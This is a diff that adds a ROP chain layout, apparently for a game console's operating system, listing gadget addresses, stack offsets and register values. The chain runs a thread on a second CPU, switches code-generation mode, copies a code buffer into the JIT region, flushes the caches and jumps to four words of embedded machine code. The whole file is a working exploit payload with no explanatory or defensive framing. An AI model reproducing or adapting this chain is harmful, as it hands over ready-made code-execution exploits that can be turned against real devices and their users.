@@ -1,0 +1,95 @@
+0x00  - ROP gadget #1 (at start, r1 is at offset 0x00)                   0x1024dd8
+0x08  - CPU1 buffer (in r3)                                              buf+0xa0
+
+0x0c  - OSRunThread()                                                    0x10421ec
+0x10  - Next pointer                                                     buf+0x3c
+
+0x14  - ROP gadget #2 (at start, r1 is at offset 0x10)                   0x103cdd4
+0x1c  - Address of CPU1 buffer pointer (in r31)                          0x1b201b2c
+
+0x24  - ROP gadget #3 (at start, r1 is at offset 0x20)                   0x103cd8c
+0x2c  - OSPanic() callback globalvar (in r31)                            0x1003AAAC
+
+0x34  - ROP gadget #4 (at start, r1 is at offset 0x30)                   0x1024dd8
+0x38  - CPU1 entry point (in r3)                                         0xd8f502c
+
+0x3c  - OSExitThread()                                                   0x1041614
+0x40  - Next pointer                                                     buf+0x3c
+
+0x44  - ROP gadget #5 (at start, r1 is at offset 0x40)                   0x103cd8c
+0x4c  - OSPanic() callback r3 globalvar (in r31)                         0x1003AAB0
+
+0x54  - ROP gadget #6 (at start, r1 is at offset 0x50)                   0x1024dd8
+0x58  - Start r3 for CPU1 (in r3)                                        0x1b201b20
+
+0x64  - ROP gadget #7 (at start, r1 is at offset 0x60)                   0x103cd8c
+
+0x74  - ROP gadget #8 (at start, r1 is at offset 0x70)                   0x1024dd8
+0x78  - int cpunum (in r3)                                               0x1
+
+0x84  - ROP gadget #9 (at start, r1 is at offset 0x80)                   0x1041174
+0x94  - Thread call list (in r31)                                        buf+0x0c
+
+0x9c  - ROP gadget #A (at start, r1 is at offset 0x98)                   0x101cd44
+
+
+
+
+0xa0  - ROP gadget #1 (at start, r1 is at offset 0xa0)                   0x1024dd8
+0xa8  - bool execute (in r3)                                             0x0
+
+0xac  - OSSwitchSecCodeGenMode()                                         0x10370c0
+0xb0  - NULL                                                             0x0
+
+0xb4  - ROP gadget #2 (at start, r1 is at offset 0xb0)                   0x103cdd4
+0xbc  - OSSwitchSecCodeGenMode() list                                    buf+0xac
+
+0xc4  - ROP gadget #3 (at start, r1 is at offset 0xb0)                   0x101cd44
+0xcc  - memcpy() list (in r31)                                           buf+0xf4
+
+0xd4  - ROP gadget #4 (at start, r1 is at offset 0xc0)                   0x1024d8c
+0xd8  - JIT address                                                      0x1800000
+0xdc  - Code buffer address (in r4)                                      buf+0x190
+0xe0  - Length of code to copy (in r5)                                   0x200
+0xe8  - Function caller gadget (in r7)                                   0x101cd44
+0xec  - Stack for memcpy() (in r1)                                       buf+0xf8
+
+0xf4  - memcpy()                                                         0x1035a6c
+0xf8  - 0                                                                0x0
+
+0xfc  - DCFlushRange() list (in r31)                                     buf+0x120
+
+0x104 - ROP gadget #6 (at start, r1 is at offset 0xf0)                   0x1024d8c
+0x108 - JIT address                                                      0x1800000
+0x10c - Length of code (in r4)                                           0x200
+0x118 - Function caller gadget (in r7)                                   0x101cd44
+0x11c - Stack for DCFlushRange() (in r1)                                 buf+0x128
+
+0x120 - DCFlushRange()                                                   0x1023ee8
+0x124 - 0                                                                0x0
+
+0x12c - ICInvalidateRange() list (in r31)                                buf+0x150
+
+0x134 - ROP gadget #8 (at start, r1 is at offset 0x120)                  0x1024d8c
+0x138 - JIT address                                                      0x1800000
+0x13c - Length of code (in r4)                                           0x200
+0x148 - Function caller gadget (in r7)                                   0x101cd44
+0x14c - Stack for ICInvalidateRange() (in r1)                            buf+0x158
+
+0x150 - ICInvalidateRange()                                              0x1024010
+0x154 - 0                                                                0x0
+
+0x15c - OSSwitchSecCodeGenMode() list (in r31)                           buf+0xac
+
+0x164 - ROP gadget #10 (at start, r1 is at offset 0x150)                 0x1024dd8
+0x168 - bool execute (in r3)                                             0x1
+
+0x174 - ROP gadget #11 (at start, r1 is at offset 0x160)                 0x101cd44
+
+0x184 - ROP gadget #12 (JIT region)                                      0x1800000
+
+0x190 - Code                                                             0x3c600101
+0x194 - Code                                                             0x6063cd70
+0x198 - Code                                                             0x7c6803a6
+0x19c - Code                                                             0x4e800020
+
